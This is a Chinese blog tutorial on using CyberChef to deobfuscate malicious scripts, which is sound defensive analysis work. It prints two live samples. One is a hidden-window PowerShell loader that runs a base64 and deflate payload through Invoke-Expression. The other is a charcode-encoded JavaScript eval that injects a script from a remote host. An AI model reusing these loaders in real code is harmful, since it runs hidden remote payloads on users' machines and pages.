+++
title = '数据处理神器Cyberchef使用指南'

description = "妈妈再也不用担心我不会编码解码了"

tags = [ "技术" ]

date = 2024-07-10T10:05:48+08:00

+++

**CyberChef**是一款强大的编码转换器，下载地址在[Cyberchef](https://github.com/gchq/CyberChef)

它简单易懂易上手，集成了多种编码转换的功能，如：base64加解密、hex转换、char转换、正则表达式等，能辅助大家方便快捷地解密出恶意脚本。

其界面如下图，最左边的Operations是转换工具集，把挑选好的工具经过DIY组合及排序拖拽到Recipe中，就可以对Input中的字符串进行相应地解密操作了，工具很多，可以在Search框中搜索，输出结果会打印在Output窗口中。

![](https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/c556944c75a7b69779f8f7f469cef859.png)

#### 示例：反混淆Powershell代码

```powershell
@echo off
if %PROCESSOR_ARCHITECTURE%==x86 (powershell.exe -NoP -NonI -W Hidden -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVRtc9pGEP7Or9jRXGekMRIyENdG45k4OG7cBocax07LMJ1DWtCF0518OvFiwn/vCquYfO0XnXa1t8+zu8+KPcMlvHca42spb7NcG+s6CzQKZacdJFI63gTycipFDIXllg5cW/oOt8oOrYFHYWzJ5ZWUOnZrn8yvksRgUTShFMpCshqJF6yN2WsspdLqYZO/uYdGW4ytF/1vLn2D3OJDSkfyxuXVvrLWiGlp8YiU5fHildkhmHzGHtgf3ENueIaEdbi8x6ISbiSfH0e+ot0mVIbzvmHNZssS6rBz9aF//fHmt0+3v//xeXD3Zfjn/ejh6+PTt7/+5tM4wdk8Fd8XMlM6fzaFLZer9eYlPG13uu/Ofj2/cIIH3U+5uTKGb1yvMStVXKFD7LKltwWDtqQ+uO6Y2I0nE2DLn2/ADxggL0qD/pfpd2oz+KMy8wJ6wC8Qrk/DEHx8hou2t3vLbmHLZhV7JzoNgs6Pmabi4tTX+xT07eQSWDJ252h9w1WiM/AzvhYZZWVJ8BnV3KbeZBfV/NgsOsqOsIXc6JhaDdsxr4hO2Jrg6HEC7J9dBKgSorAm9gWpocaFratw9Z9xv8f1AkVacL3d7ghgvgViDC4Tl2HEBPjSwlmX3k5OvC1LCclGbFEBJoSAEUBdIF2RIIjvguKKKiCtGMkIxAxc6nnheXDoOkUQbG04F8tvXx0qc3yHNhihWYoYh5rGMuCKz9FMer3Ki6aPxoqZoE3ARy5FspdTn0s5JVkS5pZZU+IuYhkZd1RwPbjRprCYBVX6J5z2pUBlowbLgk8kPDRFQPJ1nbJA4xOesk4TnIF+EVLyVjcIib/OcgKbSqp4MLr9CGfBaQRPgvq4KuDuwXO8iCkCnUcw/rCxuBdUXrUhC671SknNk2tuueuk1uZFr9XqvAvaYTc4bwdnF71ut9Mqc6oHW0w54DWYprvEyq/2nRSC2RTNNc6EEvs5sWfw72i/wCESnbYDviKryHmMsPfc1BMtwM95UdjUlA22vmS61/vp/xM2WV6rrhmuO2EY0tENvWhcN+2+VFZkGNC6otF5PZ4iGHBTpFzSbPo637gsb0LYhPHrVk9ctqZtIqPTdj2vCQeQqjS6cvzbIcQmWzerI6y2TpfWV6Uk6ex/Lf5IIua0fBhr0vb5WTcMdySBON3u/gU=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();") else (%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"nVRtc9pGEP7Or9jRXGekMRIyENdG45k4OG7cBocax07LMJ1DWtCF0518OvFiwn/vCquYfO0XnXa1t8+zu8+KPcMlvHca42spb7NcG+s6CzQKZacdJFI63gTycipFDIXllg5cW/oOt8oOrYFHYWzJ5ZWUOnZrn8yvksRgUTShFMpCshqJF6yN2WsspdLqYZO/uYdGW4ytF/1vLn2D3OJDSkfyxuXVvrLWiGlp8YiU5fHildkhmHzGHtgf3ENueIaEdbi8x6ISbiSfH0e+ot0mVIbzvmHNZssS6rBz9aF//fHmt0+3v//xeXD3Zfjn/ejh6+PTt7/+5tM4wdk8Fd8XMlM6fzaFLZer9eYlPG13uu/Ofj2/cIIH3U+5uTKGb1yvMStVXKFD7LKltwWDtqQ+uO6Y2I0nE2DLn2/ADxggL0qD/pfpd2oz+KMy8wJ6wC8Qrk/DEHx8hou2t3vLbmHLZhV7JzoNgs6Pmabi4tTX+xT07eQSWDJ252h9w1WiM/AzvhYZZWVJ8BnV3KbeZBfV/NgsOsqOsIXc6JhaDdsxr4hO2Jrg6HEC7J9dBKgSorAm9gWpocaFratw9Z9xv8f1AkVacL3d7ghgvgViDC4Tl2HEBPjSwlmX3k5OvC1LCclGbFEBJoSAEUBdIF2RIIjvguKKKiCtGMkIxAxc6nnheXDoOkUQbG04F8tvXx0qc3yHNhihWYoYh5rGMuCKz9FMer3Ki6aPxoqZoE3ARy5FspdTn0s5JVkS5pZZU+IuYhkZd1RwPbjRprCYBVX6J5z2pUBlowbLgk8kPDRFQPJ1nbJA4xOesk4TnIF+EVLyVjcIib/OcgKbSqp4MLr9CGfBaQRPgvq4KuDuwXO8iCkCnUcw/rCxuBdUXrUhC671SknNk2tuueuk1uZFr9XqvAvaYTc4bwdnF71ut9Mqc6oHW0w54DWYprvEyq/2nRSC2RTNNc6EEvs5sWfw72i/wCESnbYDviKryHmMsPfc1BMtwM95UdjUlA22vmS61/vp/xM2WV6rrhmuO2EY0tENvWhcN+2+VFZkGNC6otF5PZ4iGHBTpFzSbPo637gsb0LYhPHrVk9ctqZtIqPTdj2vCQeQqjS6cvzbIcQmWzerI6y2TpfWV6Uk6ex/Lf5IIua0fBhr0vb5WTcMdySBON3u/gU=\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();")
```

这段代码经过了简单的base64混淆，首先要做的是使用正则表达式筛选出base64正文部分：

在左侧的Operations栏将`Regular expreession`拖入Recipe中，填入匹配base64正文的正则表达式`[0-9a-zA-Z/+=]{30,}`，筛选出30个以上连续的base64编码字符。

![](https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/6b4bfb6f4fcb5fac4e83832cfdab9acf.png)

将Output format选择为List matches即可在Output中只显示符合条件的字符。

![](https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/9270746492ee8cecb8c283472cd700b8.png)

再从左侧的Operation中把Frombase64拖进来，即可直接在Output中呈现解码后的字符。

![](https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/0188bf43a403089953a99051037dc5c8.png)

注意到原Poweershell代码中还使用了`DeflateStream`函数，将`Raw Inflate`拖进Recipe即可解密。再使用`Generic Code Beautify`提高代码可读性，perfect！

![](https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/ade85d9757d591f6d7d564c415ba6411.png)

对于这一类混淆，都可以用这一套流程来解密，点击Save recipe将其保存，后面遇到相似的混淆都可以用它解决。

![](https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/2d83c1cf48c097f358e015a545b2933e.png)

#### 示例：反混淆char类型恶意脚本

```powershell
eval(String.fromCharCode(118, 97, 114, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 114, 101, 97, 116, 101, 69, 108, 101, 109, 101, 110, 116, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 116, 121, 112, 101, 32, 61, 32, 39, 116, 101, 120, 116, 47, 106, 97, 118, 97, 115, 99, 114, 105, 112, 116, 39, 59, 32, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 97, 115, 121, 110, 99, 32, 61, 32, 116, 114, 117, 101, 59, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 46, 115, 114, 99, 32, 61, 32, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 52, 44, 32, 49, 49, 54, 44, 32, 49, 49, 54, 44, 32, 49, 49, 50, 44, 32, 49, 49, 53, 44, 32, 53, 56, 44, 32, 52, 55, 44, 32, 52, 55, 44, 32, 49, 48, 49, 44, 32, 49, 50, 48, 44, 32, 57, 55, 44, 32, 49, 48, 57, 44, 32, 49, 48, 52, 44, 32, 49, 49, 49, 44, 32, 49, 48, 57, 44, 32, 49, 48, 49, 44, 32, 52, 54, 44, 32, 49, 49, 48, 44, 32, 49, 48, 49, 44, 32, 49, 49, 54, 44, 32, 52, 55, 44, 32, 49, 49, 53, 44, 32, 49, 49, 54, 44, 32, 57, 55, 44, 32, 49, 49, 54, 44, 32, 52, 54, 44, 32, 49, 48, 54, 44, 32, 49, 49, 53, 44, 32, 54, 51, 44, 32, 49, 49, 56, 44, 32, 54, 49, 44, 32, 52, 57, 44, 32, 52, 54, 44, 32, 52, 56, 44, 32, 52, 54, 44, 32, 52, 57, 41, 59, 32, 32, 32, 118, 97, 114, 32, 97, 108, 108, 115, 32, 61, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 39, 115, 99, 114, 105, 112, 116, 39, 41, 59, 32, 118, 97, 114, 32, 110, 116, 51, 32, 61, 32, 116, 114, 117, 101, 59, 32, 102, 111, 114, 32, 40, 32, 118, 97, 114, 32, 105, 32, 61, 32, 97, 108, 108, 115, 46, 108, 101, 110, 103, 116, 104, 59, 32, 105, 45, 45, 59, 41, 32, 123, 32, 105, 102, 32, 40, 97, 108, 108, 115, 91, 105, 93, 46, 115, 114, 99, 46, 105, 110, 100, 101, 120, 79, 102, 40, 83, 116, 114, 105, 110, 103, 46, 102, 114, 111, 109, 67, 104, 97, 114, 67, 111, 100, 101, 40, 49, 48, 49, 44, 32, 49, 50, 48, 44, 32, 57, 55, 44, 32, 49, 48, 57, 44, 32, 49, 48, 52, 44, 32, 49, 49, 49, 44, 32, 49, 48, 57, 44, 32, 49, 48, 49, 41, 41, 32, 62, 32, 45, 49, 41, 32, 123, 32, 110, 116, 51, 32, 61, 32, 102, 97, 108, 115, 101, 59, 125, 32, 125, 32, 105, 102, 40, 110, 116, 51, 32, 61, 61, 32, 116, 114, 117, 101, 41, 123, 100, 111, 99, 117, 109, 101, 110, 116, 46, 103, 101, 116, 69, 108, 101, 109, 101, 110, 116, 115, 66, 121, 84, 97, 103, 78, 97, 109, 101, 40, 34, 104, 101, 97, 100, 34, 41, 91, 48, 93, 46, 97, 112, 112, 101, 110, 100, 67, 104, 105, 108, 100, 40, 115, 111, 109, 101, 115, 116, 114, 105, 110, 103, 41, 59, 32, 125));
```

首先使用正则表达式`([0-9]{2,3}(,s|))+`筛选char型，然后使用`From Charcode`对字符串进行转换，在转换前需要将间隔符Delimiter选为Comma（逗号），Base选为10进制，就可以解密出恶意代码了。

![](https://pub-f40a9f95639d4cee81dcb09d9b4adf70.r2.dev/blog/2024/07/6d358ddb15e781c7bbb49ad6c86ed4dc.png)

泪目了，早用上这个东西也不至于一个个对着ASCII码表替换了，和上古时代的电报员一样。

#### 循环解密

在Operation中的`Flow control`中将`Label`拖到最前面，`Jump`拖到最后面，Jump的地址为Label的name，Maxmium jumps为要循环的次数，即可进行循环解密。

### **总结**

CyberChef 可以简单理解成一个脚本解密工具的集合，除此之外，它其实还有很多黑科技，比如解析网络数据包里的数据、解析图片的地理位置及时间信息等。
